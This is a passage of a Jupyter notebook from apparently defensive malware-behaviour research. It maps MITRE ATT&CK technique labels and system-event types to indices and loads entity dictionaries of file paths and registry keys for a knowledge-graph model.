       " 18: 'T1036.003_f5ef8466e5ebcd2ae03f338d9416069c_I',\n",
       " 19: 'T1003.002_5a484b65c247675e3b7ada4ba648d376_I',\n",
       " 20: 'T1105_0856c235a1d26113d4f2d92e39c9a9f8_I',\n",
       " 21: 'T1562.004_8fe59e288f10a486dc8b44bc872019ff_B',\n",
       " 22: 'T1105_1095434782a00c8a4772a11e625bcf5d_B',\n",
       " 23: 'T1053.005_5db2884b6ca3ab932848f295a3896dc0_B',\n",
       " 24: 'T1548.002_665432a4-42e7-4ee1-af19-a9a8c9455d0c_B',\n",
       " 25: 'T1105_c521e0a70b243a0cf9217907ca3c6d27_B',\n",
       " 26: 'T1047_09e0f9cf2eb803a1c35deeecf3665fad_I',\n",
       " 27: 'T1124_fa6e8607-e0b1-425d-8924-9b894da5a002_B',\n",
       " 28: 'T1547.001_0dbdf1a2a87e718a6ac8a8e3415a7fac_B',\n",
       " 29: 'T1053.005_ee454be9197890de62705ce6255933fd_B',\n",
       " 30: 'T1204.002_522f3f35cd013e63830fa555495a0081_I',\n",
       " 31: 'T1547.004_aa147165f6c116cb0b0f944abe1db8ce_B',\n",
       " 32: 'T1113_316251ed-6a28-4013-812b-ddf5b5b007f8_I',\n",
       " 33: 'T1115_70795de7cbb842edb029b3378c27c008_I',\n",
       " 34: 'T1562.004_280003641a5cddf916c4f2bf605a71d3_B',\n",
       " 35: 'T1036.004_7de3d7b4922a7b996d8df36fb22bb118_B',\n",
       " 36: 'T1083_52177cc1-b9ab-4411-ac21-2eadc4b5d3b8_I',\n",
       " 37: 'T1562.002_94f51bf01a7036fe02d07b4c18967669_B',\n",
       " 38: 'T1219_7dabcbecab0334b115feefab1630f84a_I',\n",
       " 39: 'T1562.004_8d0a4585e7c4646185a912b14cd9cb46_I',\n",
       " 40: 'T1552.002_3e5b04b8ee0a1a4950da8f35d95e65fc_B',\n",
       " 41: 'T1057_8adf02e8-6e71-4244-886c-98c402857404_I',\n",
       " 42: 'T1560_a1ee301b0508747b468d578a14e5c1a5_I',\n",
       " 43: 'T1074.001_e6dfc7e89359ac6fa6de84b0e1d5762e_I',\n",
       " 44: 'T1546.013_f9a968af61d36983448c74cca5464e17_B',\n",
       " 45: 'T1491_68235976-2404-42a8-9105-68230cfef562_B',\n",
       " 46: 'T1562.002_94f51bf01a7036fe02d07b4c18967669_I',\n",
       " 47: 'T1217_69bbe2183fa09c00ccaac62d48e214f8_I',\n",
       " 48: 'T1059.001_e5f9de8f-3df1-4e78-ad92-a784e3f6770d_I',\n",
       " 49: 'T1040_6881a4589710d53f0c146e91db513f01_B',\n",
       " 50: 'T1531_b25ae80dad74142fafb510e9c1949ace_B',\n",
       " 51: 'T1047_6935e41353aa781bb723462d26114c44_B',\n",
       " 52: 'T1018_a44bb43474728496276d5d73aa14588f_B',\n",
       " 53: 'T1547.010_4593d72a5145e3f494421ac772d37464_I',\n",
       " 54: 'T1119_344e7eaf650763e0d3e9f02e62c1cf4b_I',\n",
       " 55: 'T1125_da86001b5081fcf773d8e62f22cf2b00_I',\n",
       " 56: 'T1021.001_dd67068b052fa553ad4a0ac7d6a5ea89_B',\n",
       " 57: 'T1055.001_a74bc239-a196-4f7e-8d5c-fe8c0266071c_B',\n",
       " 58: 'T1547.001_163b023f43aba758d36f524d146cb8ea_B',\n",
       " 59: 'T1059.001_6efbccc1869e8cd618c0d3ecda407d5f_B',\n",
       " 60: 'T1036.003_f5ef8466e5ebcd2ae03f338d9416069c_B',\n",
       " 61: 'T1074.001_4e97e699-93d7-4040-b5a3-2e906a58199e_I',\n",
       " 62: 'T1005_720a3356-eee1-4015-9135-0fc08f7eb2d5_I',\n",
       " 63: 'T1518_8ddfaf982ab359cda13626b870ccb339_B',\n",
       " 64: 'T1219_f1b3fca18d7465cd10e5a7477a3bf97d_I',\n",
       " 65: 'T1547.004_aa147165f6c116cb0b0f944abe1db8ce_I',\n",
       " 66: 'T1105_e6715e61f5df646692c624b3499384c4_B',\n",
       " 67: 'T1564.001_dce51e632abdfe5392c7c1f942ac9273_B',\n",
       " 68: 'T1486_d82ceb9939d3d920ee550187ad8235c8_I',\n",
       " 69: 'T1046_5a4cb2be-2684-4801-9355-3a90c91e0004_I',\n",
       " 70: 'T1037.001_62cfa90fb03a6bc1a6ebcce8a3ea81b7_I',\n",
       " 71: 'T1112_257313a3c93e3bb7dfb60d6753b09e34_B',\n",
       " 72: 'T1490_c8f329d2847ede593b6cb4a1ec6120fb_I',\n",
       " 73: 'T1547.001_1f15ab22c39a9b6bb2bb0d77276dfcb3_B',\n",
       " 74: 'T1059.003_f38e58deb7ad20b5538ca40db7b7b4f8_B',\n",
       " 75: 'T1547.001_777043894e42d2aae3881e63f6c76d33_I',\n",
       " 76: 'T1082_29451844-9b76-4e16-a9ee-d6feab4b24db_B',\n",
       " 77: 'T1490_9e5e4c0655fd1b5be88bd40b8251175f_B',\n",
       " 78: 'T1547.001_d3ef4145e4144fd694514b1c5cc17350_I',\n",
       " 79: 'T1105_0856c235a1d26113d4f2d92e39c9a9f8_B',\n",
       " 80: 'T1105_60f63260-39bb-4136-87a0-b6c2dca799fc_I',\n",
       " 81: 'T1119_7121cdf93b951311be9d7078c602efdc_I',\n",
       " 82: 'T1105_1095434782a00c8a4772a11e625bcf5d_I',\n",
       " 83: 'T1201_38f6f0e50a6b196140ec40d3dc9cc9e6_B',\n",
       " 84: 'T1564_dedfa0a54c9c13ce5714a0dc2e1f5d1a_B',\n",
       " 85: 'T1112_4bfb5f265a5ce07af6bf10da113af7db_B',\n",
       " 86: 'T1547.001_4b71ebb2f6f6a01235ba240fa40ce978_I',\n",
       " 87: 'T1562.004_41627f71f968225b9f162cb76d16bd9d_I',\n",
       " 88: 'T1518_8ddfaf982ab359cda13626b870ccb339_I',\n",
       " 89: 'T1112_fd992e8ecfdac9b56dd6868904044827_B',\n",
       " 90: 'T1518.001_33a24ff44719e6ac0614b58f8c9a7c72_B',\n",
       " 91: 'T1547.001_0dbdf1a2a87e718a6ac8a8e3415a7fac_I',\n",
       " 92: 'T1059.001_55678719-e76e-4df9-92aa-10655bbd1cf4_I',\n",
       " 93: 'T1547.010_4593d72a5145e3f494421ac772d37464_B',\n",
       " 94: 'T1069.002_6103e503cb444bc7b4187704f2035708_B',\n",
       " 95: 'T1125_da86001b5081fcf773d8e62f22cf2b00_B',\n",
       " 96: 'T1120_7b9c7afaefa59aab759b49af0d699ac1_I',\n",
       " 97: 'T1069.001_5c4dd985-89e3-4590-9b57-71fed66ff4e2_I',\n",
       " 98: 'T1055.002_e5bcefee-262d-4568-a261-e8a20855ec81_B',\n",
       " 99: 'T1566.001_1afaec09315ab71fdfb167175e8a019a_I',\n",
       " 100: 'T1564.001_dce51e632abdfe5392c7c1f942ac9273_I',\n",
       " 101: 'T1090.001_ba343199a4f15ed6b57eb52412f62e4e_I',\n",
       " 102: 'T1123_372e6f46fca18e4f1b43209c20ffafa2_I',\n",
       " 103: 'T1003.002_7fa4ea18694f2552547b65e23952cabb_I',\n",
       " 104: 'T1112_fa4ba6a06b4a5cd955ea5a60fae24281_I',\n",
       " 105: 'T1137_12ad9edefc86af07700fbf49bfdac6ba_B',\n",
       " 106: 'T1057_5a39d7ed-45c9-4a79-b581-e5fb99e24f65_B',\n",
       " 107: 'T1112_ba6f6214dbd17c54001e0a163b60f151_I',\n",
       " 108: 'T1562.004_41627f71f968225b9f162cb76d16bd9d_B',\n",
       " 109: 'T1547.009_501af516bd8b24fee0c7c650ae5cc861_B',\n",
       " 110: 'T1113_316251ed-6a28-4013-812b-ddf5b5b007f8_B',\n",
       " 111: 'T1016_14a21534-350f-4d83-9dd7-3c56b93a0c17_B',\n",
       " 112: 'T1059.003_f38e58deb7ad20b5538ca40db7b7b4f8_I',\n",
       " 113: 'T1059.001_bfff9006-d1fb-46ce-b173-92cb04e9a031_B',\n",
       " 114: 'T1204.002_522f3f35cd013e63830fa555495a0081_B',\n",
       " 115: 'T1105_c76968acda4aa1673dadcd67f3ab7664_I',\n",
       " 116: 'T1135_530e47c6-8592-42bf-91df-c59ffbd8541b_B',\n",
       " 117: 'T1018_26c8b8b5-7b5b-4de1-a128-7d37fb14f517_B',\n",
       " 118: 'T1547_fe9eeee9a7b339089e5fa634b08522c1_B',\n",
       " 119: 'T1564.004_76b6066fe170d38215251102e42be973_B',\n",
       " 120: 'T1059.003_6c318ef0339d74d909ad556681b6493e_B',\n",
       " 121: 'T1112_cab7b85611a290c0769546bfa9d6f962_I',\n",
       " 122: 'T1548.002_665432a4-42e7-4ee1-af19-a9a8c9455d0c_I',\n",
       " 123: 'T1046_5a4cb2be-2684-4801-9355-3a90c91e0004_B',\n",
       " 124: 'T1137.002_e2af3c3ab1b0f659c874b8af58c49759_I',\n",
       " 125: 'T1059.001_702bfdd2-9947-4eda-b551-c3a1ea9a59a2_B',\n",
       " 126: 'T1496_46da2385-cf37-49cb-ba4b-a739c7a19de4_B',\n",
       " 127: 'T1566.001_1afaec09315ab71fdfb167175e8a019a_B',\n",
       " 128: 'T1560_a1ee301b0508747b468d578a14e5c1a5_B',\n",
       " 129: 'T1007_9d03c91bdae5a80f17f89c987942b5a8_B',\n",
       " 130: 'T1033_bd527b63-9f9e-46e0-9816-b8434d2b8989_B',\n",
       " 131: 'T1562.002_6a8d25d65a7d481dc479f89c62af1e6a_B',\n",
       " 132: 'T1112_e7a987cbef27263e666e5b096488dc55_B',\n",
       " 133: 'T1112_ba6f6214dbd17c54001e0a163b60f151_B',\n",
       " 134: 'T1047_ac2764f7a67a9ce92b54e8e59b361838_B',\n",
       " 135: 'T1070.005_1f91076e2be2014cc7b4f1296de02fd6_B',\n",
       " 136: 'T1112_35c0360d226cf38104f300d9d57ce60e_I',\n",
       " 137: 'T1564.003_9a2edad4053a2b59fb9167a9bc29e7dc_B',\n",
       " 138: 'T1490_c8f329d2847ede593b6cb4a1ec6120fb_B',\n",
       " 139: 'T1040_6881a4589710d53f0c146e91db513f01_I',\n",
       " 140: 'T1047_09e0f9cf2eb803a1c35deeecf3665fad_B',\n",
       " 141: 'T1547.004_0856714c9810ac55b53e9964d02958a0_B',\n",
       " 142: 'T1112_7fe6a66d03f4dbfc022609ba311c2b11_B',\n",
       " 143: 'T1546.013_f9a968af61d36983448c74cca5464e17_I',\n",
       " 144: 'T1074.001_4e97e699-93d7-4040-b5a3-2e906a58199e_B',\n",
       " 145: 'T1087.001_feaced8f-f43f-452a-9500-a5219488abb8_B',\n",
       " 146: 'T1112_fd992e8ecfdac9b56dd6868904044827_I',\n",
       " 147: 'T1574.001_63bbedafba2f541552ac3579e9e3737b_I',\n",
       " 148: 'T1497.001_1258b063-27d6-489b-a677-4807faacf868_B',\n",
       " 149: 'T1137_12ad9edefc86af07700fbf49bfdac6ba_I',\n",
       " 150: 'T1003_18f31c311ac208802e88ab8d5af8603e_B',\n",
       " 151: 'T1119_344e7eaf650763e0d3e9f02e62c1cf4b_B',\n",
       " 152: 'T1112_257313a3c93e3bb7dfb60d6753b09e34_I',\n",
       " 153: 'T1105_e6715e61f5df646692c624b3499384c4_I',\n",
       " 154: 'T1491_47d08617-5ce1-424a-8cc5-c9c978ce6bf9_B',\n",
       " 155: 'T1201_57296a2ddbeb7423c05feef2fe972111_B',\n",
       " 156: 'T1074.001_6469befa-748a-4b9c-a96d-f191fde47d89_B',\n",
       " 157: 'T1547_fe9eeee9a7b339089e5fa634b08522c1_I',\n",
       " 158: 'T1496_46da2385-cf37-49cb-ba4b-a739c7a19de4_I',\n",
       " 159: 'T1490_e90756bb6dcd21462dc4cc452661df91_B',\n",
       " 160: 'T1547.009_b6e5c895c6709fe289352ee23f062229_B',\n",
       " 161: 'T1007_d6bb2a19da7246731ed9c44831b135f8_B',\n",
       " 162: 'T1137.002_e2af3c3ab1b0f659c874b8af58c49759_B',\n",
       " 163: 'T1562.001_43e3334362b140924f001b256b229ee5_B',\n",
       " 164: 'T1562.004_8fe59e288f10a486dc8b44bc872019ff_I',\n",
       " 165: 'T1497.001_5dc841fd-28ad-40e2-b10e-fb007fe09e81_B',\n",
       " 166: 'T1105_4f683658f161ccdc51337c470d32bab9_I',\n",
       " 167: 'T1007_c6607391-d02c-44b5-9b13-d3492ca58599_B',\n",
       " 168: 'T1217_69bbe2183fa09c00ccaac62d48e214f8_B',\n",
       " 169: 'T1112_cd8be0e6b873919da25530a2c7ea6750_I',\n",
       " 170: 'T1531_aa6b15485a5f50ced34d87fda177b758_B',\n",
       " 171: 'T1069.001_5c4dd985-89e3-4590-9b57-71fed66ff4e2_B',\n",
       " 172: 'T1036.004_1f0614ea5c4af6faf1b44570f5f22f8a_B',\n",
       " 173: 'T1083_6e1a53c0-7352-4899-be35-fa7f364d5722_B',\n",
       " 174: 'T1090.001_ba343199a4f15ed6b57eb52412f62e4e_B',\n",
       " 175: 'T1016_71b3d2945679566b9d94d8cb11df4b70_B',\n",
       " 176: 'T1518_c9be8043-a445-4cbf-b77b-ed7bb007fc7c_B',\n",
       " 177: 'T1105_eb814e03-811a-467a-bc6d-dcd453750fa2_B',\n",
       " 178: 'T1574.011_72249c1e9ffe7d8f30243d838e0791ca_B',\n",
       " 179: 'T1562.001_43e3334362b140924f001b256b229ee5_I',\n",
       " 180: 'T1057_8adf02e8-6e71-4244-886c-98c402857404_B',\n",
       " 181: 'T1497.001_7a6ba833-de40-466a-8969-5c37b13603e0_B',\n",
       " 182: 'T1003.001_35d92515122effdd73801c6ac3021da7_B',\n",
       " 183: 'T1105_60f63260-39bb-4136-87a0-b6c2dca799fc_B',\n",
       " 184: 'T1112_fa4ba6a06b4a5cd955ea5a60fae24281_B',\n",
       " 185: 'T1021.001_dd67068b052fa553ad4a0ac7d6a5ea89_I',\n",
       " 186: 'T1490_c156ac5c9fa67080365268d95f29053d_B',\n",
       " 187: 'T1574.001_63bbedafba2f541552ac3579e9e3737b_B',\n",
       " 188: 'T1105_c521e0a70b243a0cf9217907ca3c6d27_I',\n",
       " 189: 'T1112_4bfb5f265a5ce07af6bf10da113af7db_I',\n",
       " 190: 'T1003_18f31c311ac208802e88ab8d5af8603e_I',\n",
       " 191: 'T1547.009_b6e5c895c6709fe289352ee23f062229_I',\n",
       " 192: 'T1087.001_6334877e8e3ba48f7835d4856d90a282_B',\n",
       " 193: 'T1112_e7a987cbef27263e666e5b096488dc55_I',\n",
       " 194: 'T1112_35c0360d226cf38104f300d9d57ce60e_B',\n",
       " 195: 'T1059.001_6efbccc1869e8cd618c0d3ecda407d5f_I',\n",
       " 196: 'T1490_8467c994685ccf178db166964bd80fab_B',\n",
       " 197: 'T1217_f7a0f7d704aa52a764d9d1bee81e65d6_B',\n",
       " 198: 'T1003.001_0ef4cc7b-611c-4237-b20b-db36b6906554_B',\n",
       " 199: 'T1003.001_0ef4cc7b-611c-4237-b20b-db36b6906554_I',\n",
       " 200: 'T1486_d82ceb9939d3d920ee550187ad8235c8_B',\n",
       " 201: 'T1059.001_55678719-e76e-4df9-92aa-10655bbd1cf4_B',\n",
       " 202: 'T1003.002_5a484b65c247675e3b7ada4ba648d376_B',\n",
       " 203: 'T1491_47d08617-5ce1-424a-8cc5-c9c978ce6bf9_I',\n",
       " 204: 'T1033_c0da588f-79f0-4263-8998-7496b1a40596_B',\n",
       " 205: 'T1078.001_d0ca00832890baa1d42322cf70fcab1a_B',\n",
       " 206: 'T1547.001_163b023f43aba758d36f524d146cb8ea_I',\n",
       " 207: 'T1059.001_ccdb8caf-c69e-424b-b930-551969450c57_I',\n",
       " 208: 'T1016_e8017c46-acb8-400c-a4b5-b3362b5b5baa_B',\n",
       " 209: 'T1482_cfb61005899996469ae3023796792ca5_B',\n",
       " 210: 'T1003.003_9f73269695e54311dd61dc68940fb3e1_B',\n",
       " 211: 'T1003.003_f049b89533298c2d6cd37a940248b219_B',\n",
       " 212: 'T1047_ed736a123da6fb2aab22cfd4f437e8b5_B',\n",
       " 213: 'T1105_eb814e03-811a-467a-bc6d-dcd453750fa2_I',\n",
       " 214: 'T1071.001_24c3b7b004401d839a5c337201da3484_I',\n",
       " 215: 'T1105_c76968acda4aa1673dadcd67f3ab7664_B',\n",
       " 216: 'T1491_68235976-2404-42a8-9105-68230cfef562_I',\n",
       " 217: 'T1115_b007fe0c-c6b0-4fda-915c-255bbc070de2_B',\n",
       " 218: 'T1219_f1b3fca18d7465cd10e5a7477a3bf97d_B',\n",
       " 219: 'T1490_2d53d6fabd39bf9c70b0dfcdfbbc926d_B',\n",
       " 220: 'T1071.001_24c3b7b004401d839a5c337201da3484_B',\n",
       " 221: 'T1547.009_501af516bd8b24fee0c7c650ae5cc861_I',\n",
       " 222: 'T1070.005_1f91076e2be2014cc7b4f1296de02fd6_I',\n",
       " 223: 'T1562.004_5b93df032e230056c21a3e57334f77d1_B',\n",
       " 224: 'T1057_b2a1e430ca6d36eb5af2fe666e769847_B',\n",
       " 225: 'T1482_6131397e-7765-424e-a594-3d7fb2d93a6a_I',\n",
       " 226: 'T1112_34041639e6e501856ecaf5969ee29c76_B',\n",
       " 227: 'T1087.001_6334877e8e3ba48f7835d4856d90a282_I',\n",
       " 228: 'T1074.001_e6dfc7e89359ac6fa6de84b0e1d5762e_B',\n",
       " 229: 'T1036.003_04e8d83e7badf098d50800d6aa1dd487_I',\n",
       " 230: 'T1112_e74d2fb4ef5fa6c766a4151554033697_I',\n",
       " 231: 'T1057_f8de05d1741dcc468f772ab0ff4dac72_B',\n",
       " 232: 'T1564.001_66a5fd5f244819181f074dd082a28905_I',\n",
       " 233: 'T1120_7b9c7afaefa59aab759b49af0d699ac1_B',\n",
       " 234: 'T1003.001_35d92515122effdd73801c6ac3021da7_I',\n",
       " 235: 'T1219_7dabcbecab0334b115feefab1630f84a_B',\n",
       " 236: 'T1564.003_9a2edad4053a2b59fb9167a9bc29e7dc_I',\n",
       " 237: 'T1049_a14392d713dffba6a397682ff83259a0_B',\n",
       " 238: 'T1047_f4b0b4129560ea66f9751275e82f6bab_I',\n",
       " 239: 'T1049_638fb6bb-ba39-4285-93d1-7e4775b033a8_B',\n",
       " 240: 'T1482_6131397e-7765-424e-a594-3d7fb2d93a6a_B',\n",
       " 241: 'T1047_b0255b5120cbabc062d8d4510a142c3b_B',\n",
       " 242: 'T1112_cd8be0e6b873919da25530a2c7ea6750_B',\n",
       " 243: 'T1112_cab7b85611a290c0769546bfa9d6f962_B',\n",
       " 244: 'T1059.001_bfff9006-d1fb-46ce-b173-92cb04e9a031_I',\n",
       " 245: 'T1112_7fe6a66d03f4dbfc022609ba311c2b11_I',\n",
       " 246: 'T1518.001_b8453a5fe06b24aea12b27592d5c3d3a_B',\n",
       " 247: 'T1016_921055f4-5970-4707-909e-62f594234d91_I',\n",
       " 248: 'T1018_ac20e592bc912bddff4d6b88289095f0_B',\n",
       " 249: 'T1562.004_5b93df032e230056c21a3e57334f77d1_I',\n",
       " 250: 'T1037.001_62cfa90fb03a6bc1a6ebcce8a3ea81b7_B',\n",
       " 251: 'T1069.001_a1f48fa3ddee658b29b414523c9a295b_B',\n",
       " 252: 'T1059.001_702bfdd2-9947-4eda-b551-c3a1ea9a59a2_I',\n",
       " 253: 'T1135_deeac480-5c2a-42b5-90bb-41675ee53c7e_B',\n",
       " 254: 'T1219_af8cb2bf9b436aae5c106a0a9c207e14_I',\n",
       " 255: 'T1562.004_8d0a4585e7c4646185a912b14cd9cb46_B',\n",
       " 256: 'T1007_9d03c91bdae5a80f17f89c987942b5a8_I',\n",
       " 257: 'T1564.001_66a5fd5f244819181f074dd082a28905_B',\n",
       " 258: 'O',\n",
       " 259: 'T1574.011_72249c1e9ffe7d8f30243d838e0791ca_I',\n",
       " 260: 'T1105_4f683658f161ccdc51337c470d32bab9_B',\n",
       " 261: 'T1047_ac122553ab4426ea3362bb4a97d31bfd_B',\n",
       " 262: 'T1123_372e6f46fca18e4f1b43209c20ffafa2_B',\n",
       " 263: 'T1083_52177cc1-b9ab-4411-ac21-2eadc4b5d3b8_B',\n",
       " 264: 'T1059.003_6c318ef0339d74d909ad556681b6493e_I',\n",
       " 265: 'T1547.001_4b71ebb2f6f6a01235ba240fa40ce978_B',\n",
       " 266: 'T1564.004_28862487a99f5f89bc0d68c87396c7e9_I',\n",
       " 267: 'T1547.004_0856714c9810ac55b53e9964d02958a0_I',\n",
       " 268: 'T1016_7d8ee68f0e9731db82964f558f614608_B',\n",
       " 269: 'T1219_af8cb2bf9b436aae5c106a0a9c207e14_B',\n",
       " 270: 'T1059.001_e5f9de8f-3df1-4e78-ad92-a784e3f6770d_B',\n",
       " 271: 'T1112_e74d2fb4ef5fa6c766a4151554033697_B',\n",
       " 272: 'T1119_7121cdf93b951311be9d7078c602efdc_B',\n",
       " 273: 'T1115_70795de7cbb842edb029b3378c27c008_B'}"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "index2label = {v: k for k, v in label2index.items()}\n",
    "\n",
    "index2label"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "7fb6e38a-79df-42f4-97b7-d0edba7d40fd",
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'Process Create': 0,\n",
       " 'Process Start': 1,\n",
       " 'CreateFile': 2,\n",
       " 'SetBasicInformationFile': 3,\n",
       " 'SetDispositionInformationEx': 4,\n",
       " 'SetDispositionInformationFile': 5,\n",
       " 'WriteFile': 6,\n",
       " 'TCP Connect': 7,\n",
       " 'TCP Send': 8,\n",
       " 'UDP Send': 9,\n",
       " 'TCP Disconnect': 10,\n",
       " 'RegQueryKey': 11,\n",
       " 'RegQueryValue': 12,\n",
       " 'CloseFile': 13,\n",
       " 'QueryAllInformationFile': 14,\n",
       " 'QueryAttributeTagFile': 15,\n",
       " 'QueryBasicInformationFile': 16,\n",
       " 'QueryDirectory': 17,\n",
       " 'QueryNetworkOpenInformationFile': 18,\n",
       " 'ReadFile': 19,\n",
       " 'TCP Receive': 20,\n",
       " 'UDP Receive': 21,\n",
       " 'RegCreateKey': 22,\n",
       " 'RegSetValue': 23,\n",
       " 'RegCloseKey': 24,\n",
       " 'RegDeleteValue': 25,\n",
       " 'RegOpenKey': 26}"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "file_path = '../data/3_openKE_3/relation2id.txt'\n",
    "edge_ent2idx = build_dictionary(file_path)\n",
    "\n",
    "edge_ent2idx"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "9d870077-a538-480d-98f3-794a03b48914",
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "file_path = '../data/3_openKE_3/entity2id.txt'\n",
    "node_ent2id_txt = build_dictionary(file_path)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "b24f3c77-9395-4ce2-beb1-f1f80cea32ff",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "477549\n"
     ]
    },
    {
     "ename": "KeyError",
     "evalue": "'HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\SafeBoot\\\\Option'",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mKeyError\u001b[0m                                  Traceback (most recent call last)",
      "Cell \u001b[0;32mIn[10], line 2\u001b[0m\n\u001b[1;32m      1\u001b[0m \u001b[38;5;28mprint\u001b[39m(node_ent2id_txt[\u001b[38;5;124m'\u001b[39m\u001b[38;5;124m4379921687c9a557f14c36d23279d6d4b8304e34d2cc904f9c8b9efed7824778.bin\u001b[39m\u001b[38;5;124m'\u001b[39m])\n\u001b[0;32m----> 2\u001b[0m \u001b[38;5;28mprint\u001b[39m(\u001b[43mnode_ent2id_txt\u001b[49m\u001b[43m[\u001b[49m\u001b[38;5;124;43m'\u001b[39;49m\u001b[38;5;124;43mHKLM\u001b[39;49m\u001b[38;5;130;43;01m\\\\\u001b[39;49;00m\u001b[38;5;124;43mSystem\u001b[39;49m\u001b[38;5;130;43;01m\\\\\u001b[39;49;00m\u001b[38;5;124;43mCurrentControlSet\u001b[39;49m\u001b[38;5;130;43;01m\\\\\u001b[39;49;00m\u001b[38;5;124;43mControl\u001b[39;49m\u001b[38;5;130;43;01m\\\\\u001b[39;49;00m\u001b[38;5;124;43mSafeBoot\u001b[39;49m\u001b[38;5;130;43;01m\\\\\u001b[39;49;00m\u001b[38;5;124;43mOption\u001b[39;49m\u001b[38;5;124;43m'\u001b[39;49m\u001b[43m]\u001b[49m)\n\u001b[1;32m      3\u001b[0m \u001b[38;5;28mprint\u001b[39m(node_ent2id_txt[\u001b[38;5;124m'\u001b[39m\u001b[38;5;130;01m\\x1f\u001b[39;00m\u001b[38;5;124m@028;0 2K5740 70 3@0=8FC A>B@C4=8:0<.exe\u001b[39m\u001b[38;5;124m'\u001b[39m])\n",
      "\u001b[0;31mKeyError\u001b[0m: 'HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\SafeBoot\\\\Option'"
     ]
    }
   ],
   "source": [
    "print(node_ent2id_txt['4379921687c9a557f14c36d23279d6d4b8304e34d2cc904f9c8b9efed7824778.bin'])\n",
    "print(node_ent2id_txt['HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\SafeBoot\\\\Option'])\n",
    "print(node_ent2id_txt['\\x1f@028;0 2K5740 70 3@0=8FC A>B@C4=8:0<.exe'])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "d29fcf1e-2e29-4b5f-9f46-2f784fcc161b",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "816212"
      ]
     },
     "execution_count": 11,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(node_ent2id_txt)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "id": "5d59c16c-1b10-45f8-8054-90438e29fd00",
   "metadata": {},
   "outputs": [],
   "source": [
    "# node_ent2idx = build_dictionary('../data/3_openKE/entity2id.txt')\n",
    "\n",
    "with open (f'../data/3_openKE_2/entity2id.pkl', 'rb') as fp:\n",
    "    node_ent2idx = pickle.load(fp)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "id": "712d8d18-85a4-46cc-a386-b32e7c4c471c",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "395360\n",
      "437670\n",
      "663432\n"
     ]
    }
   ],
   "source": [
    "print(node_ent2idx['4379921687c9a557f14c36d23279d6d4b8304e34d2cc904f9c8b9efed7824778.bin'])\n",
    "print(node_ent2idx['HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\SafeBoot\\\\Option'])\n",
    "print(node_ent2idx['\\x1f@028;0 2K5740 70 3@0=8FC A>B@C4=8:0<.exe'])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "id": "1c28c44a-4a77-4a0b-bab9-d2ad209c9781",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "816212"
      ]
     },
     "execution_count": 14,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(node_ent2idx)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "588c84e1-301b-4a3d-88cb-59d7a01283e5",
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'C:\\\\Users\\\\bmoore\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\hyphen-data\\\\101.0.4906.0\\\\*': 0,\n",
       " 'C:\\\\Users\\\\nicholas37\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.BingWeather_8wekyb3d8bbwe\\\\LocalState\\\\.git': 1,\n",
       " 'C:\\\\Users\\\\amanda90\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\en-GB': 2,\n",
       " 'C:\\\\Users\\\\ohall\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\logs\\\\ListSync\\\\.git': 3,\n",
       " 'C:\\\\Users\\\\ohall\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Web Notifications Deny List\\\\.git': 4,\n",
       " 'C:\\\\Users\\\\amberhernandez\\\\AppData\\\\Local\\\\Microsoft\\\\InputPersonalization\\\\*': 5,\n",
       " 'C:\\\\Users\\\\evansdaniel\\\\AppData\\\\Local\\\\Mozilla\\\\Firefox\\\\Profiles\\\\wfxwaomf.default-release\\\\cache2\\\\.git': 6,\n",
       " 'C:\\\\Users\\\\nataliekent\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\felcaaldnbdncclmgdcncolpebgiejap\\\\1.2_0\\\\_locales\\\\en_GB\\\\*': 7,\n",
       " 'C:\\\\Users\\\\amanda90\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\fr-CI\\\\*': 8,\n",
       " 'C:\\\\Users\\\\ricky35\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\WidevineCdm\\\\4.10.2391.6\\\\.git': 9,\n",
       " 'C:\\\\Users\\\\perezrodney\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.StorePurchaseApp_8wekyb3d8bbwe\\\\.git': 10,\n",
       " 'C:\\\\Users\\\\leahbrown\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\es-419': 11,\n",
       " 'C:\\\\Users\\\\john95\\\\AppData\\\\Local\\\\Mozilla\\\\Firefox\\\\Profiles\\\\wfxwaomf.default-release': 12,\n",
       " 'C:\\\\Users\\\\bakerrenee\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.HEIFImageExtension_8wekyb3d8bbwe\\\\TempState\\\\.git': 13,\n",
